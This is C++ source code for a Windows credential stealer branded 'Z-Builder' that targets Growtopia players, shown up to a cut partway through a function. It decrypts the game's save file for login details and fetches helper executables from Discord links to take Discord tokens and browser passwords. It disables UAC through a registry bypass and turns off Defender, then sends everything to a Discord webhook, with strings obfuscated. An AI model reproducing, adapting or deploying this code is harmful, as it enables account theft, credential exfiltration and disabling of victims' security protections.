// TODO:
// Add exception for when there is no save.dat

#define _CRT_SECURE_NO_WARNINGS

#include <string>
#include <Windows.h>
#include <Wininet.h>
#include <tchar.h>
#include <iostream>
#include <shlobj.h>
#include <Shlwapi.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <algorithm>
#include <ctime> 
#include <FileSystem>
#include "FileWatcher.h"
#include "XorString.h"
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#define XorString( String ) ( CXorString<ConstructIndexList<sizeof( String ) - 1>::Result>( String ).decrypt() )

using namespace std;
namespace fs = std::filesystem;

string SaveDatPath();
string GetLocation();
string trim(const string& s);
void SendMessage(string Message, string ContentType);
string savedecrypt();
string DiscordToken();
void TraceAcc();
string DownloadString(string URL);
int DownloadFile(string url, string path);
void CleanUp();
void RecoverSaveDats();
void Execute(wstring toto);
void LocateAllAccs();
string decrypt(string str);
void DeleteGT();
void RunOnStartUp();
void HideStealer();
bool VerifyLicense(string License);
string decrypt2(string toEncryt);
string ReadContent(string Path);
void WriteTempContent(string Content);
string GetMAC();
void GetBrowserCreds();
void DisableUAC();
void DisableProtections();
void GenReg();

std::string hex_to_string(const std::string& in) {
    std::string output;

    if ((in.length() % 2) != 0) {
        throw std::runtime_error("String is not valid length ...");
    }

    size_t cnt = in.length() / 2;

    for (size_t i = 0; cnt > i; ++i) {
        uint32_t s = 0;
        std::stringstream ss;
        ss << std::hex << in.substr(i * 2, 2);
        ss >> s;

        output.push_back(static_cast<unsigned char>(s));
    }

    return output;
}

INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
{
    //DisableUAC();
    //DisableProtections();
    //string License = "[mohvyqre{J2N7U6YJ}]";
    string License = "[zbuilder{zbuilder}]";
    if (true)
    {
        string FreeVersion = DownloadString(XorStr("https://pastebin.com/raw/Gc5ys6R2"));
        if (!(FreeVersion.find(XorStr("0")) != string::npos))
        {
            return 1;
        }
        string Feature = decrypt("[QvfnoyrCebg:(A)]--[Genpre:(A)]--[Erpbire:(A)]--[TrgNyyNppf:(A)]--[QryrgrTG:(A)]--[FgnegHc:(A)]--[UvqrFgrnyre:(A)]--[OebjfrePerqf:(A)]");
        //string Feature = "[DisableProt:(N)]--[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
        if (Feature.find(XorStr("[DisableProt:(Y)]")) != string::npos)
        {
            DisableUAC();
            DisableProtections();
        }
        CleanUp();
        string RawIPInfo = DownloadString(XorStr("http://icanhazip.com/"));
        string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
        string Location = GetLocation();
        // Time
        time_t tt;
        struct tm* ti;
        time(&tt);
        ti = localtime(&tt);
        string RawTime = asctime(ti);
        string Time = trim(RawTime);
        // Time - End
        // Acc Data (Main Account)
        string tempPath = getenv(XorStr("TEMP"));
        string targetString = tempPath + "\\save.dat";
        string SaveDatLocation = SaveDatPath();
        try
        {
            wstring wSaveDatLocation;
            wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
            wstring wTarget;
            wTarget.assign(targetString.begin(), targetString.end());
            try
            {
                CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
            }
            catch (...)
            {
            }
        }
        catch (...) {}
        string AccDataContent = savedecrypt();
        string GrowID;
        string Password;
        string LastWorld;
        string MAC;
        if (AccDataContent != "")
        {
            string AccDataSplit = XorStr("[---Z-Builder---]");
            size_t StringSplit = AccDataContent.find(AccDataSplit);
            GrowID = AccDataContent.substr(0, StringSplit);
            AccDataContent.erase(0, StringSplit + AccDataSplit.size());
            StringSplit = AccDataContent.find(AccDataSplit);
            Password = AccDataContent.substr(0, StringSplit);
            AccDataContent.erase(0, StringSplit + AccDataSplit.size());
            StringSplit = AccDataContent.find(AccDataSplit);
            LastWorld = AccDataContent.substr(0, StringSplit);
            AccDataContent.erase(0, StringSplit + AccDataSplit.size());
            MAC = AccDataContent;
        }
        else
        {
            GrowID = "No GrowID found";
            Password = "No password found";
            LastWorld = "No world found";
            MAC = "";
        }
        // Acc Data (Main Account) - End
        // Discord Token
        string DToken = DiscordToken();
        if (DToken == "")
        {
            DToken = "No discord token found";
        }
        // Discord Token - End
        if (IPInfo == "")
        {
            IPInfo = "N/A";
        }
        string AllMAC = GetMAC();
        replace(MAC.begin(), MAC.end(), ':', '-');
        if (!(AllMAC.find(MAC) != string::npos))
        {
            AllMAC += " | [" + MAC + "]";
        }
        else
        {
            string MainMAC = "[" + MAC + "]";
            size_t MainMACLocation = AllMAC.find(MAC);
            AllMAC.replace(MainMACLocation, MAC.length(), MainMAC);
        }
        string Info = "**MAC address(es): **`" + AllMAC + "`\\n" + "**IP address: **`" + IPInfo + "`\\n" + "**City / Region / Country: **`" + Location + "`\\n" + "**Time stolen: **`" + Time + "`\\n" + "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n" + "**Discord token: **`" + DToken + "`\\n";
        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Got an account! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
        SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
        GenReg();
        CleanUp();
        if (Feature.find(XorStr("[BrowserCreds:(Y)]")) != string::npos)
        {
            GetBrowserCreds();
            CleanUp();
        }
        if (Feature.find(XorStr("[HideStealer:(Y)]")) != string::npos)
        {
            HideStealer();
        }
        if (Feature.find(XorStr("[StartUp:(Y)]")) != string::npos)
        {
            RunOnStartUp();
        }
        if (Feature.find(XorStr("[Recover:(Y)]")) != string::npos)
        {
            RecoverSaveDats();
            CleanUp();
        }
        if (Feature.find(XorStr("[GetAllAccs:(Y)")) != string::npos)
        {
            LocateAllAccs();
            CleanUp();
        }
        if (Feature.find(XorStr("[DeleteGT:(Y)]")) != string::npos)
        {
            DeleteGT();
        }
        //MessageBox
        string Title = "+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-";
        string Message = "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-";
        if (!(Title.substr(0, 3) == "+-+"))
        {
            if (!(Message.substr(0, 3) == "=-="))
            {
                size_t TitleSplitter1 = Title.find("+");
                size_t TitleSplitter2 = Title.find("-");
                if (TitleSplitter1 < TitleSplitter2)
                {
                    Title = Title.substr(0, TitleSplitter1);
                }
                else
                {
                    Title = Title.substr(0, TitleSplitter2);
                }
                size_t MessageSplitter1 = Message.find("=");
                size_t MessageSplitter2 = Message.find("-");
                if (MessageSplitter1 < MessageSplitter2)
                {
                    Message = Message.substr(0, MessageSplitter1);
                }
                else
                {
                    Message = Message.substr(0, TitleSplitter2);
                }
                wstring wMessage;
                wMessage.assign(Message.begin(), Message.end());
                wstring wTitle;
                wTitle.assign(Title.begin(), Title.end());
                MessageBox(0, wMessage.c_str(), wTitle.c_str(), MB_OK);
            }
        }
        //MessageBox - End
        if (Feature.find(XorStr("[Tracer:(Y)]")) != string::npos)
        {
            TraceAcc();
        }
        return 0;
    }
}

std::string string_to_hex(const std::string& in) {
    std::stringstream ss;

    ss << std::hex << std::setfill('0');
    for (size_t i = 0; in.length() > i; ++i) {
        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
    }

    return ss.str();
}

void GenReg()
{
    string TempPath = getenv("TEMP");
    string RegGenPath = TempPath + "\\GenReg.exe";
    DownloadFile(XorStr("https://cdn.discordapp.com/attachments/755908849738842196/771914222962999327/GenerateReg.exe"), RegGenPath);
    string cmd = "#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$#$";
    //string cmd = "[29540]--[463350482]--[14770,14770c,14770w,14770wc]--[347512861,347512861c]#$#$#$#$";
    size_t cmdSplitter1 = cmd.find("#");
    size_t cmdSplitter2 = cmd.find("$");
    if (cmdSplitter1 < cmdSplitter2)
    {
        cmd = cmd.substr(0, cmdSplitter1);
    }
    else
    {
        cmd = cmd.substr(0, cmdSplitter2);
    }
    string Code = XorStr("cmd.exe /c \"") + RegGenPath + XorStr("\" ") + cmd;
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    string RegFilePath = TempPath + XorStr("\\AAP-Bypass.reg");
    ifstream ReadFile(RegFilePath);
    string RegString = string((istreambuf_iterator<char>(ReadFile)),
        (istreambuf_iterator<char>()));
    ReadFile.close();
    remove(RegFilePath.c_str());
    string HexString = decrypt(string_to_hex(RegString));
    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Registry string! ~Z-Builder**__\",\"description\":\"```" + HexString + "```\",\"color\":\"65535\"}] }";
    SendMessage(AllInfo, "application/json");
    remove(RegGenPath.c_str());
}

void DisableUAC()
{
    string TempPath = getenv("TEMP");
    string UACPath = TempPath + "\\UAC.bat";
    ofstream WriteUAC(UACPath);
    WriteUAC << XorStr("REG ADD \"HKCU\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe /c REG ADD HKLM\\software\\microsoft\\windows\\currentversion\\policies\\system /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\" /f") << endl;
    WriteUAC << XorStr("REG ADD \"hkcu\\software\\classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /t REG_SZ /d \" \" /f") << endl;
    WriteUAC << XorStr("fodhelper.exe");
    WriteUAC.close();
    PVOID old;
    Wow64DisableWow64FsRedirection(&old);
    string Code = "cmd.exe /c \"" + UACPath + "\"";
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    remove(UACPath.c_str());
}

void DisableProtections()
{
    // Write Helper Bat File
    string TempPath = getenv("TEMP");
    string DefenderControlPath = TempPath + "\\DC.exe";
    DownloadFile(decrypt(XorStr("uggcf://pqa.qvfpbeqncc.pbz/nggnpuzragf/755908849738842196/766840679531675708/QrsraqrePbageby.rkr")), DefenderControlPath); //Defender Control v1.5 (VERY IMPORTANT)
    string Code = "cmd.exe /c \"" + DefenderControlPath + "\"" + " /D";
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    try
    {
        remove(DefenderControlPath.c_str());
    }
    catch (...) {}
}

void GetBrowserCreds()
{
    string data = "";
    string TempPath = getenv("TEMP");
    string WBPVLocation = TempPath + "\\WBPV.exe";
    DownloadFile("https://cdn.discordapp.com/attachments/755908849738842196/762816982827270184/WebBrowserPassView.exe", WBPVLocation);
    // Write Helper Bat File
    string WBPVBatFile = TempPath + "\\WBPVBat.bat";
    ofstream WriteBat(WBPVBatFile, std::ofstream::trunc);
    WriteBat << XorStr("cd %TEMP%") << endl << XorStr("WBPV.exe /scomma %TEMP%\\Results.zb");
    WriteBat.close();
    string Code = "cmd.exe /c \"" + WBPVBatFile + "\"";
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ifstream ReadResults(TempPath + "\\Results.zb");
    string PotentialBrowserCred;
    while (getline(ReadResults, PotentialBrowserCred))
    {
        if (PotentialBrowserCred.substr(0, 4) == "http")
        {
            string BrowserCred = PotentialBrowserCred;
            string BrowserSplitter = ",";
            size_t Splitter2 = BrowserCred.find(BrowserSplitter);
            string URL = BrowserCred.substr(0, Splitter2);
            BrowserCred.erase(0, Splitter2 + 1);
            Splitter2 = BrowserCred.find(BrowserSplitter);
            BrowserCred.erase(0, Splitter2 + 1);
            Splitter2 = BrowserCred.find(BrowserSplitter);
            string UserName = BrowserCred.substr(0, Splitter2);
            BrowserCred.erase(0, Splitter2 + 1);
            Splitter2 = BrowserCred.find(BrowserSplitter);
            string Password = BrowserCred.substr(0, Splitter2 + 1);
            string BrowserLineResult = "`" + URL + " | " + UserName + " | " + Password.substr(0, Password.length() - 1) + "`\\n";
            if (!(data.size() + BrowserLineResult.size() >= 1800))
            {
                data += BrowserLineResult;
            }
            else
            {
                string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are the browser credentials! ~Z-Builder**__\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
                SendMessage(Format, "application/json");
                data = "";
            }
        }
    }
    ReadResults.close();
    if (data != "")
    {
        string Format = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are the browser credentials! ~Z-Builder**__\",\"description\":\"" + data + "\",\"color\":\"65535\"}] }";
        SendMessage(Format, "application/json");
    }
    remove(WBPVLocation.c_str());
    remove(WBPVBatFile.c_str());
    string ResultsFile = TempPath + "\\Results.zb";
    remove(ResultsFile.c_str());
}
string GetMAC()
{
    string TempPath = getenv("TEMP");
    string MACFile = TempPath + "\\MAC.bat";
    ofstream WriteScript(MACFile, std::ofstream::trunc);
    WriteScript << XorStr("powershell get-NetAdapter >> %temp%\\MAC.zb");
    WriteScript.close();
    string Code = "cmd.exe /c \"" + MACFile + "\"";
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    string Results = TempPath + "\\MAC.zb";
    ifstream ReadResult(Results);
    string PotentialMAC;
    string AllMacs = "";
    while (getline(ReadResult, PotentialMAC))
    {
        if (!(PotentialMAC == "" || PotentialMAC.substr(0, 4) == "Name" || PotentialMAC.substr(0, 4) == "----"))
        {
            try
            { // 87 
                string MAC = PotentialMAC.substr(87);
                MAC = MAC.substr(0, 17);
                AllMacs += MAC + " | ";
            }
            catch (...) {}
        }
    }
    ReadResult.close();
    remove(MACFile.c_str());
    remove(Results.c_str());
    return AllMacs.substr(0, AllMacs.length() - 3);
}
void HideStealer()
{
    try
    {
        TCHAR szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);
        DWORD attributes = GetFileAttributes(szPath);
        SetFileAttributes(szPath, attributes | FILE_ATTRIBUTE_HIDDEN);
    }
    catch (...) {}
}

// Delete growtopia
void DeleteGT()
{
    string AppDataPath = getenv("LOCALAPPDATA");
    string GTLocation = AppDataPath + "\\Growtopia\\Growtopia.exe";
    remove(GTLocation.c_str());
}
// Delete growtopia - End

// Download string
string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}

string DownloadString(string URL) {
    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HINTERNET urlFile;
    string rtn;
    if (interwebs) {
        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
        if (urlFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(interwebs);
            InternetCloseHandle(urlFile);
            string p = replaceAll(rtn, "|n", "\r\n");
            return p;
        }
    }
    InternetCloseHandle(interwebs);
    string p = replaceAll(rtn, "|n", "\r\n");
    return p;
}
// Download string - End
string SaveDatPath()
{
    string GTLocation;
    string SaveDatLocation;
    try
    {
        HKEY hKey;
        char data[255];
        DWORD datasize = sizeof(data) / sizeof(char);
        RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Growtopia"), 0, KEY_READ, &hKey);
        RegGetValueA(hKey, NULL, "path", RRF_RT_REG_SZ, NULL, (void*)data, &datasize);
        GTLocation = data;
        RegCloseKey(hKey);
    }
    catch (...)
    {
        string LOCALAPPDATA = getenv("LOCALAPPDATA");
        LOCALAPPDATA += "\\Growtopia";
        GTLocation = LOCALAPPDATA;
    }
    try
    {
        string GTFileLocation = GTLocation + "\\Growtopia.exe";
        ifstream GTFile(GTFileLocation, std::ios::binary);
        string AllBytes = string((istreambuf_iterator<char>(GTFile)),
            (istreambuf_iterator<char>()));
        GTFile.close();
        string LocationOfName = XorStr("Exiting the app");
        size_t DummyLicenseLocation = AllBytes.find(LocationOfName);
        string SaveDatName = AllBytes.substr(DummyLicenseLocation + LocationOfName.length() + 1);
        SaveDatName = SaveDatName.substr(0, 8);
        SaveDatLocation = GTLocation + "\\" + SaveDatName;
    }
    catch (...)
    {
        SaveDatLocation = GTLocation + "\\save.dat";
    }
    return SaveDatLocation;
}

string GetLocation()
{
    try
    {
        string RawDataInfo = DownloadString("https://www.geodatatool.com/");
        if (RawDataInfo.find("Too Many Requests") != string::npos)
        {
            return "Too many requests";
        }
        string delimiterLocation = "<span class=\"bold\">Country:</span>\n\n									<span>";
        size_t LocationDelimiter0 = RawDataInfo.find(delimiterLocation);
        size_t DelimiterSize = delimiterLocation.size();
        string RemovedBeginning = RawDataInfo.erase(0, LocationDelimiter0 + DelimiterSize);
        stringstream DataToParse(RemovedBeginning);
        string segment;
        vector<string> segmentList;
        while (getline(DataToParse, segment, '\n'))
        {
            segmentList.push_back(segment);
        }
        string Country = trim(segmentList[3]);
        size_t RegSpanNum = trim(segmentList[14]).find("</span");
        size_t CitySpanNum = trim(segmentList[19]).find("</span");
        string Region = trim(segmentList[14]).substr(6, RegSpanNum - 6);
        string City = trim(segmentList[19]).substr(6, CitySpanNum - 6);
        string Location = City + " / " + Region + " / " + Country;
        return Location;
    }
    catch (...)
    {
        return "Too many requests";
    }
}
string savedecrypt()
{
    string tempPath = getenv("TEMP");
    string decrypterPath = tempPath + "\\savedecrypter.exe";
    DownloadFile(XorStr("https://cdn.discordapp.com/attachments/755908849738842196/771096429880016896/savedecrypter.exe"), decrypterPath);
    string AccDataPath = tempPath + "\\Password.zb";
    remove(AccDataPath.c_str());
    string TempSaveDatLocation = tempPath + "\\save.dat";
    wstring wDecrypterPath;
    wDecrypterPath.assign(decrypterPath.begin(), decrypterPath.end());
    Execute(wDecrypterPath);
    string AccDataContent;
    try
    {
        ifstream RawAccData(AccDataPath);
        AccDataContent = string((istreambuf_iterator<char>(RawAccData)),
            (istreambuf_iterator<char>()));
        RawAccData.close();
    }
    catch (...)
    {
        string AccDataContent = "";
    }
    return AccDataContent;
}

string DiscordToken()
{
    string tempPath = getenv("TEMP");
    string DiscordTokenGrabberEXE = tempPath + "\\ZBDiscordTokenGrabber.exe";
    const char* DiscordTokenGrabberPath = DiscordTokenGrabberEXE.c_str();
    DownloadFile(decrypt2(XorStr("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk09j|en`38cvh~vBD363'+6To1 >+3bb?7~-!7")), DiscordTokenGrabberEXE);
    string DiscordTokenTXT = tempPath + "\\DiscordToken.txt";
    wstring wDiscordTokenTXT;
    wDiscordTokenTXT.assign(DiscordTokenTXT.begin(), DiscordTokenTXT.end());
    try { DeleteFile(wDiscordTokenTXT.c_str()); }
    catch (...) {}
    WinExec(DiscordTokenGrabberPath, SW_HIDE);
    string DiscordToken;
    try
    {
        ifstream RawDCToken(DiscordTokenTXT);
        DiscordToken = string((istreambuf_iterator<char>(RawDCToken)),
            (istreambuf_iterator<char>()));
    }
    catch (...)
    {
        DiscordToken = "No discord token found";
    }
    try { DeleteFile(wDiscordTokenTXT.c_str()); }
    catch (...) {}
    return DiscordToken;
}
// Recover accounts from recycle bin
void RecoverSaveDats()
{
    string Info;
    string FullData;
    string tempPath = getenv("TEMP");
    string tempSaveDat = tempPath + "\\save.dat";
    string ZBRecoveredFolder = tempPath + "\\ZBRecoveredFolder";
    try
    {
        filesystem::remove_all(ZBRecoveredFolder);
        filesystem::create_directory(ZBRecoveredFolder);
    }
    catch (...)
    {
        filesystem::create_directory(ZBRecoveredFolder);
    }
    string ps1file = ZBRecoveredFolder + "\\RecoverFiles.ps1";
    ofstream WritePS1(ps1file);
    WritePS1 << decrypt(XorStr("$furyy = Arj-Bowrpg -PbzBowrpg Furyy.Nccyvpngvba")) << endl;
    WritePS1 << decrypt(XorStr("$erplpyrOva = $furyy.Anzrfcnpr(0kN)")) << endl;
    WritePS1 << decrypt(XorStr("$erplpyrOva.Vgrzf() | %{Pbcl-Vgrz $_.Cngu (\"")) + ZBRecoveredFolder + decrypt(XorStr("\\{0}\" -s ($_.Anzr+[fgevat](Trg-Enaqbz)))} -ReebeNpgvba FvyragylPbagvahr"));
    WritePS1.close();
    string Code = decrypt(XorStr("pzq.rkr /p Cbjrefuryy.rkr -AbCebsvyr -RkrphgvbaCbyvpl haerfgevpgrq -svyr \"")) + ps1file + "\"";
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    string SaveDatLocation = SaveDatPath();
    std::filesystem::path p(SaveDatLocation);
    for (const auto& entry : fs::directory_iterator(ZBRecoveredFolder))
    {
        if (!(entry.path().string().find("save") != string::npos || entry.path().string().find(p.stem().string()) != string::npos))
        {
            remove(entry.path());
        }
    }
    string tempResult = tempPath + "\\Password.zb";
    for (const auto& entry : fs::directory_iterator(ZBRecoveredFolder))
    {
        filesystem::rename(entry.path().string(), tempSaveDat);
        savedecrypt();
        ifstream RawRecoveredAccContent(tempResult);
        string RecoveredAccDataContent((istreambuf_iterator<char>(RawRecoveredAccContent)),
            (istreambuf_iterator<char>()));
        if (RecoveredAccDataContent != "")
        {
            FullData += RecoveredAccDataContent + XorStr("[Z-Builder]");
        }
        remove(tempPath.c_str());
    }
    while (FullData.find(XorStr("[Z-Builder]")) != string::npos)
    {
        size_t Splitter = FullData.find(XorStr("[Z-Builder]"));
        string SplitData = FullData.substr(0, Splitter + 11);
        FullData.erase(0, Splitter + 11);
        string AccDataSplit = XorStr("[---Z-Builder---]");
        size_t LocateAccInfo = SplitData.find(AccDataSplit);
        string GrowID = SplitData.substr(0, LocateAccInfo);
        SplitData.erase(0, LocateAccInfo + 17);
        LocateAccInfo = SplitData.find(AccDataSplit);
        string Password = SplitData.substr(0, LocateAccInfo);
        SplitData.erase(0, LocateAccInfo + 17);
        LocateAccInfo = SplitData.find(AccDataSplit);
        string LastWorld = SplitData.substr(0, LocateAccInfo);
        SplitData.erase(0, LocateAccInfo + 17);
        Splitter = FullData.find(XorStr("[Z-Builder]"));
        SplitData.erase(0, Splitter + 11);
        Info += "**GrowID: **`" + GrowID + "`\\n" + "**Password: **`" + Password + "`\\n" + "**Last world: **`" + LastWorld + "`\\n\\n";
    }
    if (Info != "")
    {
        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"__**Here are the recovered account(s)! ~Z-Builder**__\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
        SendMessage(AllInfo, "application/json");
    }
}
// Recover accounts from recycle bin - End

// Get all accounts in the PC (besides recycle bin)
void LocateAllAccs()
{
    string tempPath = getenv("TEMP");
    string SaveDatLocation = SaveDatPath();
    const size_t last_slash_idx = SaveDatLocation.rfind('\\');
    string savedat;
    if (std::string::npos != last_slash_idx)
    {
        savedat = SaveDatLocation.substr(last_slash_idx + 1);
    }
    string BatFile = tempPath + "\\ScanPC.bat";
    string Results = tempPath + "\\SaveDatLocation.txt";
    try
    {
        remove(Results.c_str());
        ofstream CreateResults(Results);
        CreateResults.close();
    }
    catch (...)
    {
        ofstream CreateResults(Results);
        CreateResults.close();
    }
    try
    {
        remove(BatFile.c_str());
        ofstream WriteScript(BatFile);
        WriteScript << XorStr("cd %USERPROFILE%") << endl << XorStr("dir ") + savedat + decrypt(XorStr(" /F /O > %grzc%\\FnirQngYbpngvba.gkg"));
        WriteScript.close();
    }
    catch (...)
    {
        ofstream WriteScript(BatFile);
        WriteScript << XorStr("cd %USERPROFILE%") << endl << XorStr("dir ") + savedat + decrypt(XorStr(" /F /O > %grzc%\\FnirQngYbpngvba.gkg"));
        WriteScript.close();
    }
    string Code = "cmd.exe /c \"" + BatFile + "\"";
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ifstream ReadResult(Results);
    string LocationResults((istreambuf_iterator<char>(ReadResult)),
        (istreambuf_iterator<char>()));
    string AccResults = tempPath + "\\Password.zb";
    string AllData;
    while (LocationResults.find("\n") != string::npos)
    {
        string StringToSplit = "\n";
        string destination = tempPath + "\\save.dat";
        size_t Splitter = LocationResults.find(StringToSplit);
        string aLocation = LocationResults.substr(0, Splitter);
        fs::copy_file(aLocation, destination, fs::copy_options::overwrite_existing);
        try
        {
            remove(AccResults.c_str());
        }
        catch (...) {}
        savedecrypt();
        string AccData;
        try
        {
            ifstream ReadAccInfo(AccResults);
            AccData = string((istreambuf_iterator<char>(ReadAccInfo)),
                (istreambuf_iterator<char>()));
            if (AccData != "")
            {
                AllData += AccData + "[Z-Builder]";
            }
        }
        catch (...) {}
        LocationResults.erase(0, Splitter + StringToSplit.size());
    }
    string Info;
    while (AllData.find("[Z-Builder]") != string::npos)
    {
        string Splits = "[Z-Builder]";
        string MiniSplit = "[---Z-Builder---]";
        size_t Splitter = AllData.find("[Z-Builder]");
        string aData = AllData.substr(0, Splitter);
        size_t MiniSplitter = aData.find("[---Z-Builder---]");
        string GrowID = aData.substr(0, MiniSplitter);
        aData.erase(0, MiniSplitter + MiniSplit.size());
        MiniSplitter = aData.find("[---Z-Builder---]");
        string Password = aData.substr(0, MiniSplitter);
        aData.erase(0, MiniSplitter + MiniSplit.size());
